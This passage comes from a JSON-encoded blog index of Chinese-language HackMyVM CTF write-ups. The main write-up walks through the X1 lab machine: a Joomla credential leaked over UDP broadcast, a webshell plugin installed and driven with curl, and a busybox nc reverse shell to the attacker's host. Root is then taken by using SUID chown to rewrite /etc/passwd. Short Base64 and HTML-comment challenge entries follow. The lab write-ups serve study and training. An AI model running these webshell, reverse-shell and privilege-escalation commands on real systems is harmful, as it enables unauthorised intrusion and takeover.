eth0 ff02::1\n# ... (ping6 \u6b63\u5e38\uff0c\u53d1\u73b0 fe80::a00:27ff:feaa:93a3%eth0) ...\n\u2514\u2500$ nmap -6 -p- fe80::a00:27ff:feaa:93a3%eth0\n# ... (\u626b\u63cf\u7ed3\u679c\u8fd8\u662f\u53ea\u6709 22 \u548c 80) ...\n```\n\nIPv6 \u8fd9\u8fb9\u6ca1\u5565\u5e7a\u86fe\u5b50\u3002\n\n**UDP \u7aef\u53e3\u626b\u4e00\u4e0b\u5e38\u89c1\u7684\uff1a**\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -sU --top-ports 100 192.168.205.207 \n# ... (\u626b\u63cf\u7ed3\u679c) ...\nPORT   STATE         SERVICE\n68/udp open|filtered dhcpc\n```\n\n\u5e38\u89c1\u7684100\u4e2aUDP\u7aef\u53e3\u4e5f\u6ca1\u5565\u53d1\u73b0\uff08\u5982\u679c\u4ed6\u7aef\u53e3\u5f00\u5728100\u540d\u5f00\u5916\uff0c\u90a3\u5bf9\u6211\u53ef\u771f\u662f\u7edd\u6740\u4e86\uff09\u3002\n\n\u8fd9\u4e0b\u7ed9\u6211\u6574\u6000\u7591\u4eba\u751f\u4e86\uff0c\u53bb\u7785\u4e86\u773c\u9776\u673a\u96be\u5ea6\uff1a\n![image-20250511215218183](https://7r1umphk.github.io/image/20250511215218301.webp)\n'\u6bd4\u8f83\u7b80\u5355'\uff1f\uff1f\uff1f\u96be\u9053\u662f\u6211\u53d8\u83dc\u4e86\uff1f\uff1f\uff1f\n\n#### 7. \u5cf0\u56de\u8def\u8f6c\uff0c\u76d1\u542c\u7f51\u7edc\u6d41\u91cf\uff01\n\n\u4e4b\u524d\u9047\u5230\u8fc7\u4f1a\u5b9a\u65f6\u53d1\u5305\u7684\u9776\u673a\uff0c\u8bd5\u8bd5\u770b\u6709\u6ca1\u6709\u52a8\u9759\u3002\n`tcpdump` \u76d1\u542c ICMP\uff1a\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo tcpdump -A -n icmp\n# ... (\u4e00\u7247\u5bc2\u9759) ...\n```\n\n\u6bdb\u7ebf\u6ca1\u6709\uff0c\u554a\u554a\u554a\uff01TCP\u7684\u5305\u4e5f\u770b\u4e86\u4e00\u5806\uff0c\u9664\u4e86\u6211\u81ea\u5df1\u7684\u6d41\u91cf\uff0c\u4e5f\u6ca1\u5565\u7279\u522b\u7684\uff08\u79c1\u4eba\u7684\u5305\u5c31\u4e0d\u8d34\u4e0a\u6765\u4e86\uff09\u3002\n\n**\u6700\u540e\u5e0c\u671b\uff0cUDP\u6d41\u91cf\uff1a**\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo tcpdump -A -n udp \ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n09:57:33.971737 IP 192.168.205.207.48368 > 255.255.255.255.5000: UDP, length 1\nE.....@.@................       h.8.................\n09:57:33.971797 IP 192.168.205.207.48368 > 255.255.255.255.5000: UDP, length 1\nE.....@.@................       h.8.................\n# ... (\u6301\u7eed\u51fa\u73b0\u7c7b\u4f3c\u7684 UDP \u5305\uff0c\u76ee\u6807\u7aef\u53e3 5000\uff0c\u957f\u5ea6\u4e3a 1) ...\n09:58:02.059998 IP 192.168.205.207.39435 > 255.255.255.255.5000: UDP, length 1\nE...+t@.@................       Q.r.................\n# ... (\u6570\u636e\u5185\u5bb9\u5728\u53d8\u5316\uff0c\u4f46\u90fd\u662f\u5355\u4e2a\u5b57\u7b26) ...\n```\n\n\u6211\u53bb\uff01\u5728\u8fd9\u513f\u7b49\u7740\u6211\u5462\uff01\u76ee\u6807\u4e3b\u673a `192.168.205.207` \u5728\u5f80\u5e7f\u64ad\u5730\u5740 `255.255.255.255` \u7684 UDP 5000 \u7aef\u53e3\u53d1\u5305\uff0c\u6bcf\u6b21\u4e00\u4e2a\u5b57\u7b26\u3002\n\u8fd9\u4e0d\u5c31\u5bf9\u4e0a\u4e86\u5417\uff1f\u9996\u9875\u90a3\u4e2a 'shark'\uff08\u9ca8\u9c7c\uff09... **Wireshark**\uff01\u8349\uff0c\u539f\u6765\u662f\u8fd9\u4e2a\u610f\u601d\uff01\n\n\u8d76\u7d27\u628a\u8fd9\u4e9b\u5b57\u7b26\u63d0\u53d6\u51fa\u6765\u3002\u4e00\u4e2a\u4e2a\u590d\u5236\u7c98\u8d34\u592a\u8822\u4e86\uff0c\u4e0d\u7406\u89e3\u4f46\u5c0a\u91cd\u60f3\u90a3\u4e48\u5e72\u7684\u52c7\u58eb\u3002\n\u4ed4\u7ec6\u89c2\u5bdf\u53d1\u73b0\uff0c\u5b83\u662f\u5728UDP 5000\u7aef\u53e3\u4e0b\u53d1\u9001\u6570\u636e\u3002\u7528 `nc` \u8bd5\u8bd5\uff1a\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lu -p 5000\nr^C \n```\n\n\u7b49\u4e86\u4e00\u4f1a\u513f\uff0c`nc` \u53ea\u80fd\u63a5\u6536\u4e00\u4e2a\u5b57\u7b26\uff0c\u800c\u4e14\u63a5\u6536\u5b8c\u5c31\u65ad\u4e86\u3002\u8fd9\u4e0d\u884c\u554a\uff0c\u5f97\u60f3\u4e2a\u529e\u6cd5\u6301\u7eed\u63a5\u6536\u3002\u6211\u53bb\u95ee\u4e86GPT\uff0c\u5b83\u7ed9\u4e86\u4e2a\u7528 `ncat` \u7684\u65b9\u6cd5\uff1a\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ncat -luk -p 5000\n8182602383ce1root:00dae9e3052fb2255408182602383ce1^C\n```\n\n\u6210\u4e86\uff01\u6355\u83b7\u5230\u4e00\u4e32\u5b57\u7b26\uff1a`root:00dae9e3052fb2255408182602383ce1`\n\n### \u4e8c\u3001\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\n\n\u6309\u7167\u6211\u5bf9\u7fa4\u4e3b\u7684\u7406\u89e3\uff0c\u5c31\u7b97\u9776\u673a\u6807\u7684\u201c\u6bd4\u8f83\u7b80\u5355\u201d\uff0c\u4e5f\u4e0d\u4f1a\u76f4\u63a5\u5c31\u9001\u4e2a root \u5bc6\u7801\u3002\u8fd9\u4e32 `root:00dae9e3052fb2255408182602383ce1` \u770b\u7740\u5c31\u50cf\u7528\u6237\u540d\u548c\u5bc6\u7801\uff08\u6216\u8005\u5bc6\u7801\u54c8\u5e0c\uff09\uff0c\u8fd9\u5e94\u8be5\u662f Joomla \u540e\u53f0 `/administrator/` \u7684\u767b\u5f55\u51ed\u636e\u3002\n\n#### 1. \u767b\u5f55Joomla\u540e\u53f0\n\n\u7528\u7528\u6237\u540d `root` \u548c\u5bc6\u7801 `00dae9e3052fb2255408182602383ce1` \u5c1d\u8bd5\u767b\u5f55 `http://192.168.205.207/administrator/`\u3002\n\n\u6210\u529f\u767b\u5f55\uff01\u6211\u8fd8\u4ee5\u4e3a\u8981\u89e3\u4e2aHash\u5462\u3002\n\n#### 2. \u4e0a\u4f20Webshell\u63d2\u4ef6\n\n\u8fdb\u4e86\u540e\u53f0\uff0c\u8fd9\u79cdCMS\u6700\u5e38\u89c1\u7684GetShell\u65b9\u5f0f\u5c31\u662f\u901a\u8fc7\u63d2\u4ef6\u4e0a\u4f20Webshell\u3002\n\n![image-20250511222523465](https://7r1umphk.github.io/image/20250511222523819.webp)\u5728GitHub\u4e0a\u641c\u4e86\u4e00\u4e0b 'Joomla webshell plugin'\uff0c\u5f88\u5feb\u627e\u5230\u4e86\u4e00\u4e2a\u73b0\u6210\u7684\uff1a\n`https://github.com/p0dalirius/Joomla-webshell-plugin`\n\n![image-20250511222613763](https://7r1umphk.github.io/image/20250511222613917.webp)\n\n\u6839\u636e\u9879\u76ee\u8bf4\u660e\uff0c\u5728\u5b83\u7684 `dist` \u76ee\u5f55\u91cc\u4e0b\u8f7d\u4e00\u4e2a\u6253\u5305\u597d\u7684 `mod_webshell.zip` \u5c31\u884c\u3002\n\n\u56de\u5230Joomla\u540e\u53f0\uff0c'System' -> 'Install' -> 'Extensions'\uff0c\u4e0a\u4f20\u5e76\u5b89\u88c5 `mod_webshell.zip`\u3002\n\u5b89\u88c5\u6210\u529f\u540e\uff0c\u6839\u636e\u63d2\u4ef6\u7684\u8bf4\u660e\u6587\u6863\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u7279\u5b9a\u8def\u5f84\u6765\u6267\u884c\u547d\u4ee4\u3002\n\n![image-20250511222957053](https://7r1umphk.github.io/image/20250511222957204.webp)\n\n\u6d4b\u8bd5\u4e00\u4e0b\u547d\u4ee4\u6267\u884c\uff1a\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -X POST 'http://192.168.205.207/modules/mod_webshell/mod_webshell.php' --data 'action=exec&cmd=id'\n{'stdout':'uid=33(www-data) gid=33(www-data) groups=33(www-data)\\n','stderr':'','exec':'id'}\n```\n\n\u547d\u4ee4\u6210\u529f\u6267\u884c\uff0c\u5f53\u524d\u7528\u6237\u662f `www-data`\u3002\n\n### \u4e09\u3001\u53cd\u5f39Shell\u4e0e\u63d0\u6743\n\n#### 1. \u83b7\u53d6\u53cd\u5f39Shell\n\n\u5148\u5728Kali\u4e0a\u76d1\u542c\u7aef\u53e3\uff1a\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 8888    \nlistening on [any] 8888 ...\n```\n\n\u7136\u540e\u901a\u8fc7Webshell\u6267\u884c\u53cd\u5f39\u547d\u4ee4\uff1a\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -X POST 'http://192.168.205.207/modules/mod_webshell/mod_webshell.php' --data 'action=exec&cmd=nc 192.168.205.206 8888 -e /bin/bash'\n{'stdout':'','stderr':'sh: 1: nc: not found\\n','exec':'nc 192.168.205.206 8888 -e \\/bin\\/bash'}\n```\n\n\u76ee\u6807\u673a\u4e0a\u6ca1\u6709 `nc`\u3002\u8bd5\u8bd5 `busybox nc`\uff1a\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]                                                                                                                                                     \n\u2514\u2500$ curl -X POST 'http://192.168.205.207/modules/mod_webshell/mod_webshell.php' --data 'action=exec&cmd=busybox nc 192.168.205.206 8888 -e /bin/sh'\n```\n\n\u8fd9\u6b21\u6210\u529f\u4e86\uff01Kali\u7684\u76d1\u542c\u5668\u6536\u5230\u4e86\u8fde\u63a5\uff1a\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]                                                                                                                                                                \n\u2514\u2500$ nc -lvnp 8888                                                                                                                                                                  \nlistening on [any] 8888 ...                                                                                                                                                        \nconnect to [192.168.205.206] from (UNKNOWN) [192.168.205.207] 39696\n```\n\n#### 2. \u7a33\u5b9aShell\n\n\u5f97\u5230\u7684\u521d\u59cbShell\u4e0d\u592a\u597d\u7528\uff0c\u9700\u8981\u7a33\u5b9a\u4e00\u4e0b\uff1a\n\n```bash\n# \u5728\u53cd\u5f39\u56de\u6765\u7684shell\u91cc\u6267\u884c\nscript /dev/null -c bash\n# \u6309 Ctrl+Z \u653e\u5230\u540e\u53f0\n# \u5728Kali\u7ec8\u7aef\u6267\u884c\nstty raw -echo; fg\n# \u56de\u8f66\uff0c\u7136\u540e\u7ee7\u7eed\u5728\u53cd\u5f39shell\u91cc\u6267\u884c\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 24 columns 80 # \u6839\u636e\u81ea\u5df1\u7ec8\u7aef\u8c03\u6574\n```\n\nOK\uff0c\u73b0\u5728\u6709\u4e2a\u50cf\u6837\u7684Shell\u4e86\u3002\n\n#### 3. \u6743\u9650\u63d0\u5347 (`www-data` -> `root`)\n\n\u5f53\u524d\u7528\u6237 `www-data`\uff1a\n\n```\nwww-data@X1:/$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u5230\u5904\u7ffb\u7ffb\u770b\uff0c\u5148\u770b\u770b `/home` \u548c `/var/www` \u76ee\u5f55\uff1a\n\n```shell\nwww-data@X1:/$ cd /home/\nwww-data@X1:/home$ ls -al\ntotal 12\ndrwxr-xr-x  3 root    root    4096 Apr 11 22:27 .\ndrwxr-xr-x 19 root    root    4096 May 10 03:38 ..\ndrwx------  2 welcome welcome 4096 May 10 03:44 welcome\nwww-data@X1:/home$ cd /var/www/html\nwww-data@X1:/var/www/html$ ls -al \n# ... (Joomla \u6587\u4ef6\u5217\u8868) ...\nwww-data@X1:/var/www/html$ cat web.config.txt \n<?xml version='1.0' encoding='UTF-8'?>\n<configuration>\n   <location path='.'>\n   <system.webServer>\n       <directoryBrowse enabled='false' />\n       <rewrite>\n           <rules>\n               <rule name='Joomla! Common Exploits Prevention' stopProcessing='true'>\n                   <match url='^(.*)$' ignoreCase='false' />\n                   <conditions logicalGrouping='MatchAny'>\n                       <add input='{QUERY_STRING}' pattern='base64_encode[^(]*\\([^)]*\\)' ignoreCase='false' />\n                       <add input='{QUERY_STRING}' pattern='(&gt;|%3C)([^s]*s)+cript.*(&lt;|%3E)' />\n                       <add input='{QUERY_STRING}' pattern='GLOBALS(=|\\[|\\%[0-9A-Z]{0,2})' ignoreCase='false' />\n                       <add input='{QUERY_STRING}' pattern='_REQUEST(=|\\[|\\%[0-9A-Z]{0,2})' ignoreCase='false' />\n                   </conditions>\n                   <action type='CustomResponse' url='index.php' statusCode='403' statusReason='Forbidden' statusDescription='Forbidden' />\n               </rule>\n               <rule name='Joomla! API Application SEF URLs'>\n                   <match url='^api/(.*)' ignoreCase='false' />\n                   <conditions logicalGrouping='MatchAll'>\n                     <add input='{URL}' pattern='^/api/index.php' ignoreCase='true' negate='true' />\n                     <add input='{REQUEST_FILENAME}' matchType='IsFile' ignoreCase='false' negate='true' />\n                     <add input='{REQUEST_FILENAME}' matchType='IsDirectory' ignoreCase='false' negate='true' />\n                   </conditions>\n                   <action type='Rewrite' url='api/index.php' />\n               </rule>\n               <rule name='Joomla! Public Frontend SEF URLs'>\n                   <match url='(.*)' ignoreCase='false' />\n                   <conditions logicalGrouping='MatchAll'>\n                     <add input='{URL}' pattern='^/index.php' ignoreCase='true' negate='true' />\n                     <add input='{REQUEST_FILENAME}' matchType='IsFile' ignoreCase='false' negate='true' />\n                     <add input='{REQUEST_FILENAME}' matchType='IsDirectory' ignoreCase='false' negate='true' />\n                   </conditions>\n                   <action type='Rewrite' url='index.php' />\n               </rule>\n           </rules>\n       </rewrite>\n       <httpProtocol>\n           <customHeaders>\n               <add name='X-Content-Type-Options' value='nosniff' />\n               <!-- Protect against certain cross-origin requests. More information can be found here: -->\n               <!-- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy_(CORP) -->\n               <!-- https://web.dev/why-coop-coep/ -->\n               <!-- <add name='Cross-Origin-Resource-Policy' value='same-origin' /> -->\n               <!-- <add name='Cross-Origin-Embedder-Policy' value='require-corp' /> -->\n           </customHeaders>\n       </httpProtocol>\n   </system.webServer>\n   </location>\n</configuration>\n```\n\n\u5bfb\u627eSUID\u6587\u4ef6\u8fdb\u884c\u63d0\u6743\uff1a\n\n```shell\nwww-data@X1:/var/www/html$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/chown  <-- \u8001\u670b\u53cb\u4e86\uff01\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\n```\n\n\u53d1\u73b0\u4e86 `/usr/bin/chown` \u8fd9\u4e2a\u8001\u670b\u53cb\uff0c\u5e76\u4e14\u6709SUID\u6743\u9650\u3002\n\u67e5\u9605 GTFOBins ([https://gtfobins.github.io/gtfobins/chown/#suid](https://gtfobins.github.io/gtfobins/chown/#suid))\uff1a\n\n![image-20250511223840468](https://7r1umphk.github.io/image/20250511223840670.webp)\n\n\u601d\u8def\u5c31\u662f\u7528 `chown` \u628a `/etc/passwd` \u7684\u6240\u6709\u6743\u6539\u6210 `www-data`\uff0c\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u7f16\u8f91\u5b83\uff0c\u7ed9root\u7528\u6237\u6539\u4e2a\u5bc6\u7801\uff08\u6216\u8005\u76f4\u63a5\u6dfb\u52a0\u4e00\u4e2a\u5e26root\u6743\u9650\u7684\u65b0\u7528\u6237\uff09\u3002\n\n**\u751f\u6210\u5bc6\u7801\u54c8\u5e0c\uff1a**\n\u5728Kali\u4e0a\u7528 `openssl` \u751f\u6210\u4e00\u4e2a\u5bc6\u7801 `888888` \u7684\u54c8\u5e0c\uff1a\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ openssl passwd 888888   \n$1$FRnIm4sd$wXAhXRwWvKAL1viFFq.9A1\n```\n\n**\u5f00\u59cb\u64cd\u4f5c\uff1a**\n\u5728 `www-data` \u7684Shell\u91cc\uff1a\n\n1. \u66f4\u6539 `/etc/passwd` \u7684\u6240\u6709\u6743\uff1a\n\n   ```shell\n   www-data@X1:/var/www/html/administrator$ chown www-data:www-data /etc/passwd\n   ```\n\n2. \u7f16\u8f91 `/etc/passwd` (\u5982\u679c\u76ee\u6807\u673a\u4e0a\u6709 `nano` \u6216 `vi` \u5c31\u65b9\u4fbf\u591a\u4e86\uff0c\u6ca1\u6709\u7684\u8bdd\u5c31\u5f97\u60f3\u529e\u6cd5\u628a\u5185\u5bb9\u5f04\u51fa\u6765\u6539\u4e86\u518d\u8986\u76d6\u56de\u53bb)\uff1a\n\n   ```shell\n   www-data@X1:/var/www/html/administrator$ nano /etc/passwd\n   ```\n\n   \u627e\u5230 `root` \u7528\u6237\u90a3\u4e00\u884c\uff0c\u901a\u5e38\u662f `root:x:0:0:root:/root:/bin/bash`\uff0c\u628a `x` \u66ff\u6362\u6210\u6211\u4eec\u751f\u6210\u7684\u54c8\u5e0c `$1$FRnIm4sd$wXAhXRwWvKAL1viFFq.9A1`\u3002\n   \u4fee\u6539\u540e\u53d8\u6210\uff1a`root:$1$FRnIm4sd$wXAhXRwWvKAL1viFFq.9A1:0:0:root:/root:/bin/bash`\n\n   ![image-20250511224840653](https://7r1umphk.github.io/image/20250511224840863.webp)\n   \u4fdd\u5b58\u9000\u51fa\u3002\n\n3. \u5207\u6362\u5230 `root` \u7528\u6237\uff1a\n\n   ```shell\n   www-data@X1:/var/www/html/administrator$ su -\n   Password:  # \u8f93\u5165 888888\n   root@X1:~# id\n   uid=0(root) gid=0(root) groups=0(root)\n   ```\n\n   \u6210\u529f\u62ff\u5230 root \u6743\u9650\uff01\n\n#### 4. \u8bfb\u53d6\u6700\u7ec8\u7684 Flag\n\n```shell\nroot@X1:~# cat /root/root.txt\nflag{root-72c0cd908b77fd5a4d0c988f7e002431}    \n```\n\n\u641e\u5b9a\uff01\n\n### \u56db\u3001\u603b\u7ed3\n\n\u8fd9\u4e2a X1 \u9776\u673a\uff0c\u524d\u671f\u4fe1\u606f\u6536\u96c6\u9636\u6bb5\u90a3\u4e2a UDP 80 \u7aef\u53e3\u7684'\u9ca8\u9c7c'\u63d0\u793a\u786e\u5b9e\u6709\u70b9\u610f\u601d\uff0c\u6ca1\u6ce8\u610f\u5230\u7684\u8bdd\u4f30\u8ba1\u5f97\u5361\u4e00\u4f1a\u513f\uff08\u6211\u5c31\u662f\u90a3\u4e2a\u51a4\u79cd\uff09\u3002\u62ff\u5230 Joomla \u540e\u53f0\u51ed\u636e\u540e\uff0c\u4e0a\u4f20\u63d2\u4ef6 getshell \u5c5e\u4e8e\u5e38\u89c4\u64cd\u4f5c\u3002\u6700\u540e\u7684 `chown` SUID \u63d0\u6743\u4e5f\u662f\u6bd4\u8f83\u7ecf\u5178\u7684\u5229\u7528\u65b9\u5f0f\u3002\u6574\u4f53\u6765\u8bf4\uff0c\u786e\u5b9e\u662f\u201c\u6bd4\u8f83\u7b80\u5355\u201d\uff0c\u4f46\u8fc7\u7a0b\u8fd8\u662f\u633a\u6709\u8da3\u7684\u3002sentence", "top": 0, "createdAt": 1751016581, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P37": {"htmlDir": "docs/post/Challenge 007\uff1a-fan-zhuan-zi-fu-yu-Base64-jie-ma-fen-xi.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 007\uff1a\u53cd\u8f6c\u5b57\u7b26\u4e0eBase64\u89e3\u7801\u5206\u6790", "postUrl": "post/Challenge%20007%EF%BC%9A-fan-zhuan-zi-fu-yu-Base64-jie-ma-fen-xi.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/37", "commentNum": 0, "wordCount": 1718, "description": "# \u521d\u59cb\u89c2\u5bdf\n\n*   **\u6311\u6218\u94fe\u63a5:** [https://hackmyvm.eu/challenges/challenge.php?c=007](https://hackmyvm.eu/challenges/challenge.php?c=007)\n\n## \u521d\u59cb\u89c2\u5bdf\n\n\u8bbf\u95ee\u6311\u6218\u9875\u9762\u540e\uff0c\u5c55\u793a\u4e86\u4ee5\u4e0b\u7ecf\u8fc7\u7279\u6b8a\u5904\u7406\u7684\u5b57\u7b26\u4e32\uff1a\n\n![image-20250518101535788](https://7r1umphk.github.io/image/20250518101535983.webp)\n\n\u539f\u59cb\u5b57\u7b26\u4e32\u4e3a\uff1a\n```\n=0Xd0\u029e\u0190MOqWM\u03c2\u042fz\u0258W\u0196\u018e\u01a7\n```\n\u8be5\u5b57\u7b26\u4e32\u5305\u542b\u53cd\u8f6c\u5b57\u7b26\u548c Unicode \u7279\u6b8a\u5b57\u7b26\uff0c\u521d\u6b65\u5224\u65ad\u9700\u8981\u8fdb\u884c\u6587\u672c\u53cd\u8f6c\u548c\u5b57\u7b26\u66ff\u6362\u64cd\u4f5c\u3002\u90e8\u5206\u5b57\u7b26\u53ef\u80fd\u56e0\u672c\u5730\u7cfb\u7edf\u5b57\u4f53\u5e93\u4e0d\u5b8c\u6574\u800c\u663e\u793a\u5f02\u5e38\u3002\n\n## \u63a2\u7d22\u8fc7\u7a0b\n\n\u9488\u5bf9\u8be5\u5b57\u7b26\u4e32\u7684\u7279\u6027\uff0c\u6211\u4eec\u91c7\u53d6\u4e86\u4ee5\u4e0b\u6b65\u9aa4\u8fdb\u884c\u5206\u6790\u548c\u89e3\u7801\u3002\n\n### 1. \u5b57\u7b26\u4e32\u53cd\u8f6c\u5904\u7406\n\n\u9996\u5148\uff0c\u5bf9\u539f\u59cb\u5b57\u7b26\u4e32\u8fdb\u884c\u6574\u4f53\u53cd\u8f6c\u3002\u53ef\u4f7f\u7528\u5728\u7ebf\u6587\u672c\u53cd\u8f6c\u5de5\u5177\uff0c\u4f8b\u5982 `textfixer.com` \u63d0\u4f9b\u7684\u5de5\u5177\uff1a\n\n![image-20250518102657623](https://7r1umphk.github.io/image/20250518102657806.webp)\n\n[https://www.textfixer.com/tools/reverse-text-generator.php](https://www.textfixer.com/tools/reverse-text-generator.php)\n\n\u8f93\u5165\u539f\u59cb\u5b57\u7b26\u4e32\u540e\uff0c\u5de5\u5177\u8f93\u51fa\u7684\u53cd\u8f6c\u7ed3\u679c\uff08\u6216\u624b\u52a8\u53cd\u8f6c\u5e76\u90e8\u5206\u89c4\u8303\u5316\u540e\uff09\u5982\u4e0b\uff1a\n\n![image-20250518102747809](https://7r1umphk.github.io/image/20250518102747978.webp)\n\n```\nSE\u0196WezR\u03c2MWqOM\u0190k0dX0=\n```\n\u53ef\u4ee5\u770b\u5230\uff0c\u90e8\u5206\u6613\u4e8e\u8bc6\u522b\u7684\u53cd\u8f6c\u5b57\u7b26\uff08\u5982 `\u042f` -> `R`, `\u029e` -> `k`\uff09\u5df2\u88ab\u5de5\u5177\u6216\u521d\u6b65\u624b\u52a8\u5904\u7406\u8fd8\u539f\uff0c\u4f46\u4ecd\u5b58\u5728\u4e00\u4e9b\u7279\u6b8a Unicode \u5b57\u7b26\uff08\u5982 `\u0196`, `\u03c2`, `\u0190`\uff09\u9700\u8981\u8fdb\u4e00\u6b65\u5904\u7406\u3002\n\n### 2. \u7279\u6b8a\u5b57\u7b26\u8bc6\u522b\u4e0e\u66ff\u6362\n\n\u63a5\u4e0b\u6765\uff0c\u9700\u8981\u5bf9\u5269\u4f59\u7684\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8bc6\u522b\uff0c\u5e76\u66ff\u6362\u4e3a\u6807\u51c6\u7684 ASCII \u5b57\u7b26\u3002\u8fd9\u4e00\u6b65\u901a\u5e38\u57fa\u4e8e\u5b57\u7b26\u5f62\u72b6\u7684\u76f8\u4f3c\u6027\u548c\u5728\u7f16\u7801\u4e2d\uff08\u5982 Base64\uff09\u7684\u5e38\u89c1\u5bf9\u5e94\u5173\u7cfb\u8fdb\u884c\u63a8\u65ad\u3002\n\n\u539f\u59cb\u53cd\u8f6c\u5b57\u7b26\u4e32\uff1a `SE\u0196WezR\u03c2MWqOM\u0190k0dX0=`\n\n\u6839\u636e\u5b57\u7b26\u5f62\u6001\u8fdb\u884c\u5982\u4e0b\u66ff\u6362\uff1a\n*   `\u03c2` (Greek Small Letter Sigma Symbol) \u7c7b\u4f3c\u4e8e\u6570\u5b57 `2`\u3002\u66ff\u6362\u540e\uff1a\n    `SE\u0196WezR2MWqOM\u0190k0dX0=`\n*   `\u0190` (Latin Capital Letter Open E) \u7c7b\u4f3c\u4e8e\u6570\u5b57 `3`\u3002\u66ff\u6362\u540e\uff1a\n    `SE\u0196WezR2MWqOM3k0dX0=`\n*   \u8003\u8651\u5230 Base64 \u7f16\u7801\u7684\u5b57\u7b26\u96c6\uff0c\u4ee5\u53ca\u4e0a\u4e0b\u6587\uff0c`q` \u53ef\u80fd\u5bf9\u5e94 `p`\uff0c`d` \u53ef\u80fd\u5bf9\u5e94 `b`\u3002\u66ff\u6362\u540e\uff1a\n    `SE\u0196WezR2MWpOM3k0bX0=`\n*   `\u0196` (Latin Letter Iota) \u7c7b\u4f3c\u4e8e\u6570\u5b57 `1`\u3002\u66ff\u6362\u540e\uff1a\n    `SE1WezR2MWpOM3k0bX0=`\n\n\u7ecf\u8fc7\u4e0a\u8ff0\u5b57\u7b26\u66ff\u6362\uff0c\u5f97\u5230\u4e00\u4e2a\u7ed3\u6784\u66f4\u6e05\u6670\u7684\u5b57\u7b26\u4e32\uff1a\n```\nSE1WezR2MWpOM3k0bX0=\n```\n\u8be5\u5b57\u7b26\u4e32\u4ee5 `=` \u7ed3\u5c3e\uff0c\u4e14\u5176\u5b57\u7b26\u96c6\uff08\u5927\u5199\u5b57\u6bcd\u3001\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\uff09\u7b26\u5408 Base64 \u7f16\u7801\u7684\u7279\u5f81\u3002\n\n### 3. Base64 \u89e3\u7801\n\n\u786e\u8ba4\u5b57\u7b26\u4e32\u4e3a Base64 \u7f16\u7801\u540e\uff0c\u4f7f\u7528 Base64 \u89e3\u7801\u5de5\u5177\u6216\u547d\u4ee4\u8fdb\u884c\u89e3\u7801\u3002\n\u53ef\u4ee5\u4f7f\u7528 `base64` \u547d\u4ee4\u884c\u5de5\u5177\uff1a\n\n\u6267\u884c\u547d\u4ee4\uff1a\n```bash\necho 'SE1WezR2MWpOM3k0bX0=' | base64 -d\n```\n\u89e3\u7801\u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a\n```\nHMV{4v1jN3y4m}\n```\n\u6b64\u5373\u4e3a\u6311\u6218\u7684 Flag\u3002\n\n## Flag\n\n\u6700\u7ec8\u83b7\u53d6\u7684 Flag \u4e3a\uff1a\n\n`HMV{4v1jN3y4m}`sentence", "top": 0, "createdAt": 1751016583, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P38": {"htmlDir": "docs/post/Challenge 009.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 009", "postUrl": "post/Challenge%20009.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/38", "commentNum": 0, "wordCount": 273, "description": "# 1. \u521d\u6b65\u5206\u6790\n\n**\u6311\u6218\u94fe\u63a5:** https://hackmyvm.eu/challenges/challenge.php?c=009\n\n![\u6311\u6218\u56fe\u7247](https://7r1umphk.github.io/image/20250518105248414.webp)\n\n## 1. \u521d\u6b65\u5206\u6790\n\n\u8bbf\u95ee\u8be5\u94fe\u63a5\u540e\uff0c\u9875\u9762\u663e\u4e00\u884c\u6587\u5b57\uff1a\n\n```html\nThe flag is here. <!-- HMV{infrontofme} -->\n```\n## 2. Flag\n\n\u6700\u7ec8\u7684 Flag 